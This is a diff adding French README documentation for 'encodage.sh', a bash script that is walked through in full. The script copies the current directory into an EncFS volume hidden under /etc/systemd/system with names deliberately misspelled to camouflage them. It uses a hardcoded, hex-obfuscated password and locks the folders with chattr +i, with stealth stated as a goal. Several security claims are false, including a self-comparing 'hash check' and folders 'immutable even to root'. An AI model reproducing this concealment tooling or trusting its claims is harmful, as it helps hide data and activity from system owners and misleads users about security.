@@ -671,3 +671,225 @@ Le script `install.sh` automatise completement le deploiement :
 4. **Activation** des services automatiques
 5. **Configuration** des mecanismes de dissimulation
 
+
+# encodage.sh
+
+## Description
+Script de chiffrement de données utilisant EncFS pour créer un système de stockage sécurisé avec authentification par hash.
+
+## Fonctionnalités
+- **Vérification d'authenticité** : Validation par hash SHA-256 avant exécution
+- **Chiffrement automatique** : Création d'un volume EncFS chiffré
+- **Installation des dépendances** : Installation automatique d'encfs et expect si nécessaire
+- **Copie sécurisée** : Transfert de tous les fichiers du répertoire courant vers le volume chiffré
+- **Protection finale** : Application d'attributs immutables sur les dossiers
+
+## Technologies utilisées
+
+### EncFS - Le système de chiffrement
+**Pourquoi EncFS ?**
+- **Chiffrement transparent** : Les fichiers sont chiffrés automatiquement lors de l'écriture et déchiffrés à la lecture
+- **Chiffrement au niveau fichier** : Chaque fichier est chiffré individuellement avec AES-256
+- **Compatibilité** : Fonctionne sur la plupart des systèmes Linux sans modification du noyau
+- **Performance** : Chiffrement/déchiffrement en temps réel sans impact majeur sur les performances
+
+### Expect - L'automatisation des interactions
+**Pourquoi Expect ?**
+- **Automatisation sécurisée** : Permet de saisir automatiquement les mots de passe sans les exposer dans l'historique
+- **Gestion des prompts** : Répond automatiquement aux questions d'EncFS (configuration, mots de passe)
+- **Évite l'intervention manuelle** : Le script peut s'exécuter de manière autonome
+- **Sécurité des credentials** : Les mots de passe ne sont jamais stockés en clair dans des fichiers
+
+## Analyse détaillée du script
+
+### 1. Config de base
+```bash
+#!/bin/bash
+set -e
+REPERTOIRE_COURANT=$(pwd)
+DOSSIER_CHIFFRE="/etc/systemd/system/load_net"
+DOSSIER_MONTE="/etc/systemd/system/networrk"
+HASH_REFERENCE="dc08160901551a78c7e63598654103d8e808579a175203161be05933f0d8376a"
+```
+**Ce que ca fait :**
+- `#!/bin/bash` : dit au systeme d'utiliser bash pour executer
+- `set -e` : si une commande plante, tout s'arrete (securité)
+- `REPERTOIRE_COURANT=$(pwd)` : retient ou on est actuellement
+- `DOSSIER_CHIFFRE` : la ou on stocke les fichier cryptés (nom bizarre exprès)
+- `DOSSIER_MONTE` : la ou on peut voir les fichier décryptés (faute de frappe volontaire pour camoufler)
+- `HASH_REFERENCE` : une sorte de "mot de passe" en SHA-256 pour verifier qu'on a le droit
+
+### 2. Generation du password securisé
+```bash
+generer_mot_de_passe() {
+    if [ "$HASH_REFERENCE" = "dc08160901551a78c7e63598654103d8e808579a175203161be05933f0d8376a" ]; then
+        MOT_DE_PASSE=$(printf "\x63\x72\x79\x73\x74\x61\x6c\x32")
+        return 0
+    else
+        return 1
+    fi
+}
+```
+**Ce que ca fait :**
+- Verifie si le hash correspond (comme un mot de passe principal)
+- Si c'est bon, genere le vrais mot de passe "crystal2" mais écrit en hexadecimal pour pas que ca se voit
+- `\x63\x72\x79\x73\x74\x61\x6c\x32` = "crystal2" en code
+- return 0 = ok, return 1 = pas ok
+
+### 3. Install des outils necessaires
+```bash
+verifier_dependances() {
+    if ! command -v encfs &> /dev/null; then
+        sudo apt update && sudo apt install -y encfs
+    fi
+    if ! command -v expect &> /dev/null; then
+        sudo apt install -y expect
+    fi
+}
+```
+**Ce que ca fait :**
+- `command -v encfs` : regarde si encfs est installé
+- `&> /dev/null` : cache les message d'erreur
+- Si encfs manque, fait `apt update` puis `apt install encfs`
+- Pareil pour expect (sert a automatiser les reponses)
+- `-y` : repond oui automatiquement aux questions d'installation
+
+### 4. Creation du systeme de fichier crypté
+```bash
+creer_encfs() {
+    [ -d "$DOSSIER_MONTE" ] && sudo fusermount -u "$DOSSIER_MONTE" 2>/dev/null || true
+    sudo mkdir -p "$DOSSIER_CHIFFRE"
+    sudo mkdir -p "$DOSSIER_MONTE"
+    sudo chown root:root "$DOSSIER_CHIFFRE" "$DOSSIER_MONTE"
+    sudo chmod 755 "$DOSSIER_CHIFFRE" "$DOSSIER_MONTE"
+    expect << EOF
+spawn encfs "$DOSSIER_CHIFFRE" "$DOSSIER_MONTE"
+expect "?>"
+send "\r"
+expect "New Encfs Password:"
+send "$MOT_DE_PASSE\r"
+expect "Verify Encfs Password:"
+send "$MOT_DE_PASSE\r"
+expect eof
+EOF
+}
+```
+**Ce que ca fait :**
+- `[ -d "$DOSSIER_MONTE" ]` : verifie si le dossier existe deja
+- `fusermount -u` : demonte le volume si il était deja monté
+- `mkdir -p` : cree les dossier (avec les parents si besoin)
+- `chown root:root` : met root comme proprietaire (plus securisé)
+- `chmod 755` : donne les permission (lecture/ecriture pour root, lecture pour les autres)
+- `expect` : automatise les reponse a encfs
+  - `spawn` : lance la commande encfs
+  - `expect "?>"` : attend que encfs demande la config
+  - `send "\r"` : appuie sur entrée (config par defaut)
+  - Puis repond au mot de passe automatiquement
+
+### 5. Montage pour acceder aux fichier
+```bash
+monter_encfs() {
+    sudo mkdir -p "$DOSSIER_MONTE"
+    sudo chown $USER:$USER "$DOSSIER_MONTE"
+    sudo chmod 755 "$DOSSIER_MONTE"
+    expect << EOF
+spawn encfs "$DOSSIER_CHIFFRE" "$DOSSIER_MONTE"
+expect "EncFS Password:"
+send "$MOT_DE_PASSE\r"
+expect eof
+EOF
+}
+```
+**Ce que ca fait :**
+- Prepare le point de montage
+- `chown $USER:$USER` : donne la propriété a l'utilisateur actuel
+- Monte le volume crypté en donnant le mot de passe automatiquement
+- Une fois monté, on peut lire/ecrire dans le dossier comme si c'était normal
+
+### 6. Copie de tout les fichier
+```bash
+copier_donnees() {
+    if [ -z "$(ls -A "$REPERTOIRE_COURANT" 2>/dev/null)" ]; then
+        return
+    fi
+    cp -r "$REPERTOIRE_COURANT"/.[!.]* "$DOSSIER_MONTE/" 2>/dev/null || true
+    cp -r "$REPERTOIRE_COURANT"/* "$DOSSIER_MONTE/" 2>/dev/null || true
+}
+```
+**Ce que ca fait :**
+- `ls -A` : liste tous les fichier (même cachés)
+- `[ -z "..." ]` : verifie si c'est vide
+- Si ya rien, fait rien et sort
+- `cp -r` : copie récursivement (avec sous-dossier)
+- `.[!.]*` : tous les fichier cachés (qui commence par . mais pas .. ou .)
+- `/*` : tous les fichier normaux
+- `2>/dev/null || true` : ignore les erreur (certains fichier peuvent pas etre copiés)
+
+### 7. Verrouillage final
+```bash
+finaliser_chiffrement() {
+    fusermount -u "$DOSSIER_MONTE"
+    echo "CHIFFREMENT TERMINER"
+    sudo chattr +i "$DOSSIER_CHIFFRE"
+    sudo chattr +i "$DOSSIER_MONTE"
+}
+```
+**Ce que ca fait :**
+- `fusermount -u` : demonte le volume (les fichier redevienne inaccessible)
+- `echo` : affiche un message
+- `chattr +i` : met l'attribut "immutable" = impossible a supprimer même en root
+- Maintenant les dossier sont verrouillés et les fichier cryptés
+
+## Execution du script
+```bash
+if ! generer_mot_de_passe; then
+    echo "Mauvais mauvais"
+    exit 1
+fi
+verifier_dependances
+creer_encfs
+copier_donnees
+finaliser_chiffrement
+```
+**Ce que ca fait :**
+- Lance `generer_mot_de_passe()`, si ca marche pas, affiche "Mauvais mauvais" et arrete
+- Sinon fait toute les etapes dans l'ordre
+- A la fin, tout est crypté et verrouillé
+
+## Garanties de sécurité
+
+### Protection des données
+1. **Chiffrement AES-256** : Meme la NSA galere dessus
+2. **Chiffrement par fichier** : Si un fichier est cracké, les autre sont safe
+3. **Clés uniques** : Chaque fichier a sa propre clé generée
+
+### Protection d'accès  
+1. **Hash d'authentification** : Faut connaitre le bon hash pour lancer le script
+2. **Noms de dossier camouflés** : Cachés dans les fichier système, personne regarde la
+3. **Attributs immutable** : Meme root peut pas les virer
+
+### Protection contre les attaque
+1. **Password en hexa** : Pas visible dans le code
+2. **Auto-démontage** : Les fichier sont accessible que pendant l'execution
+3. **Permission restrictive** : Seul root peut toucher
+4. **Intégrité du script** : Le hash detecte si quelqu'un a modifié le script
+
+## Utilisation
+```bash
+chmod +x encodage.sh
+./encodage.sh
+```
+
+## Prérequis
+- Droits sudo (faut etre admin)
+- Linux avec FUSE
+- Internet pour installer les dependance
+
+## Niveau de sécurité
+- **Confidentialité** : AES-256, personne peut lire sans le password
+- **Intégrité** : Hash SHA-256 pour detecter les modification
+- **Accès controlé** : Seul ceux qui ont le hash peuvent utiliser
+- **Furtivité** : Caché dans l'arborescence, personne soupçonne rien
+
+**Note importante :** Ce système est tres securisé mais faut pas perdre le hash de reference ni oublier le mot de passe, sinon c'est mort pour recuperer les fichier !
+
